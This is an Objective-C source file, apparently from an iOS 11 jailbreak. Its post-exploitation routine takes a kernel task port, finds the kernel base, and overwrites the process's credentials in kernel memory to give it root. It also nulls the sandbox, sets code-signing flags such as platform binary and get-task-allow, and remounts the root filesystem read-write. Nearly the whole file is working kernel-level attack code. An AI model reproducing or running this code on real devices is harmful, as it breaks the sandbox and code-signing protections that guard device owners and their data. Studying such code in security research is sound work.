#import <Foundation/Foundation.h>
#include "ku.h"
#include "patchfinder64.h"
#include "kmem.h"
#include "remount/rootfs_remount.h"
#include "remount/apfs_util.h"
#include "kexecute.h"
#include <sys/mount.h>
#include "offsetof.h"
#include <UIKit/UIKit.h>
#define SYSTEM_VERSION_EQUAL_TO(v) ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedSame)
#define SYSTEM_VERSION_GREATER_THAN(v) ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedDescending)
#define SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(v) ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN(v) ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] == NSOrderedAscending)
#define SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(v) ([[[UIDevice currentDevice] systemVersion] compare:v options:NSNumericSearch] != NSOrderedDescending)
#define CS_VALID 0x0000001    /* dynamically valid */
#define CS_ADHOC 0x0000002    /* ad hoc signed */
#define CS_GET_TASK_ALLOW 0x0000004    /* has get-task-allow entitlement */
#define CS_INSTALLER 0x0000008    /* has installer entitlement */
#define CS_HARD 0x0000100    /* don't load invalid pages */
#define CS_KILL 0x0000200    /* kill process if it becomes invalid */
#define CS_CHECK_EXPIRATION 0x0000400    /* force expiration checking */
#define CS_RESTRICT 0x0000800    /* tell dyld to treat restricted */
#define CS_ENFORCEMENT 0x0001000    /* require enforcement */
#define CS_REQUIRE_LV 0x0002000    /* require library validation */
#define CS_ENTITLEMENTS_VALIDATED 0x0004000
#define CS_ALLOWED_MACHO 0x00ffffe
#define CS_EXEC_SET_HARD 0x0100000    /* set CS_HARD on any exec'ed process */
#define CS_EXEC_SET_KILL 0x0200000    /* set CS_KILL on any exec'ed process */
#define CS_EXEC_SET_ENFORCEMENT 0x0400000    /* set CS_ENFORCEMENT on any exec'ed process */
#define CS_EXEC_SET_INSTALLER 0x0800000    /* set CS_INSTALLER on any exec'ed process */
#define CS_KILLED 0x1000000    /* was killed by kernel for invalidity */
#define CS_DYLD_PLATFORM 0x2000000    /* dyld used to load this is a platform binary */
#define CS_PLATFORM_BINARY 0x4000000    /* this is a platform binary */
#define CS_PLATFORM_PATH 0x8000000    /* platform binary by the fact of path (osx only) */
#define CS_DEBUGGED 0x10000000  /* process is currently or has previously been debugged and allowed to run with invalid pages */
#define CS_SIGNED 0x20000000  /* process has a signature (may have gone invalid) */
#define CS_DEV_CODE 0x40000000  /* code is dev signed, cannot be loaded into prod signed code (will go away with rdar://problem/28322552) */
BOOL remounted() {
//#define guionly
#ifndef guionly
    NSError *no;
    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/.write_test"]) {
        [[NSFileManager defaultManager] removeItemAtPath:@"/.write_test" error:nil];
        if ([[NSFileManager defaultManager] fileExistsAtPath:@"/.write_test"]) {
            return false;
        }
    }
    [[NSFileManager defaultManager] createFileAtPath:@"/.write_test" contents:nil attributes:nil];
    if ([[NSFileManager defaultManager] fileExistsAtPath:@"/.write_test"]) {
        [[NSFileManager defaultManager] removeItemAtPath:@"/.write_test" error:&no];
        if ([[NSFileManager defaultManager] fileExistsAtPath:@"/.write_test"] || no) {
            return false;
        } else {
            return true;
        }
    } else {
        return false;
    }
    return false;
#endif
    return true;
}
static vm_address_t get_kernel_base(mach_port_t kernel_task) {
    uint64_t addr = 0xfffffff028004000;
    while (1) {
        char *buf;
        mach_msg_type_number_t sz = 0;
        kern_return_t ret = vm_read(kernel_task, addr, 0x200, (vm_offset_t*)&buf, &sz);
        if (ret) {
            goto next;
        }
        if (*((uint32_t *)buf) == 0xfeedfacf) {
            int ret = vm_read(kernel_task, addr, 0x1000, (vm_offset_t*)&buf, &sz);
            if (ret != KERN_SUCCESS) {
                goto next;
            }
            for (uintptr_t i=addr; i < (addr+0x2000); i+=(sizeof(uintptr_t))) {
                mach_msg_type_number_t sz;
                int ret = vm_read(kernel_task, i, 0x120, (vm_offset_t*)&buf, &sz);
                if (ret != KERN_SUCCESS) {
                    exit(-1);
                }
                if (!strcmp(buf, "__text") && !strcmp(buf+0x10, "__PRELINK_TEXT")) {
                    return addr;
                }
            }
        }
    next:
        addr -= 0x200000;
    }
}
BOOL post_exploitation(mach_port_t tfp0) {
    if (tfp0 == 0) {
        return false;
    }
    uint64_t base = get_kernel_base(tfp0);
    uint64_t slide = base - 0xfffffff007004000;
    init_kernel(base, NULL);
    init_kernel_utils(tfp0);
    init_kexecute();
    uint64_t proc = proc_for_pid(getpid());
    uint64_t ucred = rk64(proc + offsetof_p_ucred);
    wk32(proc + offsetof_p_uid, 0);
    wk32(proc + offsetof_p_ruid, 0);
    wk32(proc + offsetof_p_gid, 0);
    wk32(proc + offsetof_p_rgid, 0);
    wk32(ucred + offsetof_ucred_cr_uid, 0);
    wk32(ucred + offsetof_ucred_cr_ruid, 0);
    wk32(ucred + offsetof_ucred_cr_svuid, 0);
    wk32(ucred + offsetof_ucred_cr_ngroups, 1);
    wk32(ucred + offsetof_ucred_cr_groups, 0);
    wk32(ucred + offsetof_ucred_cr_rgid, 0);
    wk32(ucred + offsetof_ucred_cr_svgid, 0);
    wk64(rk64(ucred + 0x78) + 16, 0);
    printf("uid: %i\n", getuid());
    printf("gid: %i\n", getgid());
    printf("sandbox: %i\n", rk64(rk64(ucred + 0x78) + 16) != 0);
    wk32(proc + offsetof_p_csflags, (rk32(proc + offsetof_p_csflags) | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_DEBUGGED) & ~(CS_RESTRICT | CS_HARD | CS_KILL));
    if (SYSTEM_VERSION_GREATER_THAN_OR_EQUAL_TO(@"11.3") && SYSTEM_VERSION_LESS_THAN_OR_EQUAL_TO(@"11.3.1")) {
        remountRootAsRW(slide, proc_for_pid(0), proc_for_pid(getpid()), list_snapshots("/"));
    } else if (SYSTEM_VERSION_LESS_THAN(@"11.3")) {
        uint64_t rootfs_vnode = rk64(find_rootvnode());
        uint64_t v_mount = rk64(rootfs_vnode + offsetof_v_mount);
        uint32_t v_flag = rk32(v_mount + offsetof_mnt_flag);
        v_flag = v_flag & ~MNT_NOSUID;
        v_flag = v_flag & ~MNT_RDONLY;
        wk32(v_mount + offsetof_mnt_flag, v_flag & ~MNT_ROOTFS);
        char *nmz = strdup("/dev/disk0s1s1");
        mount("apfs", "/", MNT_UPDATE, (void *)&nmz);
        v_mount = rk64(rootfs_vnode + offsetof_v_mount);
        wk32(v_mount + offsetof_mnt_flag, v_flag);
    }
    BOOL ret = true;
    if (!remounted()) {
        ret = false;
    }
    printf("remounted: %i\n", ret);
    return ret;
}
